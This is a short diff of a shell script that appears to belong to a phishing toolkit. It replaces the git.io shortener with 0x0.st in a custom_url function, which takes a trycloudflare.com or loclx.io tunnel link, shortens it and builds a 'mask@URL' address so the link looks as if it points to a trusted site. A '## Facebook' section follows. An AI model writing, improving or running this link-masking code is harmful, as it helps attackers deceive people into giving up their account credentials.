@@ -577,11 +577,11 @@ custom_url() {
     url=${1#http*//}
     isgd="https://is.gd/create.php?format=simple&url="
     shortcode="https://api.shrtco.de/v2/shorten?url="
-    gitio="https://git.io"
+    zer0x="https://0x0.st"
 
     { custom_mask; sleep 1; clear; banner_small; }
     if [[ ${url} =~ [-a-zA-Z0-9.]*(trycloudflare.com|loclx.io) ]]; then
-        shorten $gitio "$url"
+        shorten $zer0x "$url"
         processed_url="https://$processed_url"
         masked_url="$mask@$processed_url"
     else
@@ -593,6 +593,7 @@ custom_url() {
     echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
     [[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
 }
+
 
 
 ## Facebook
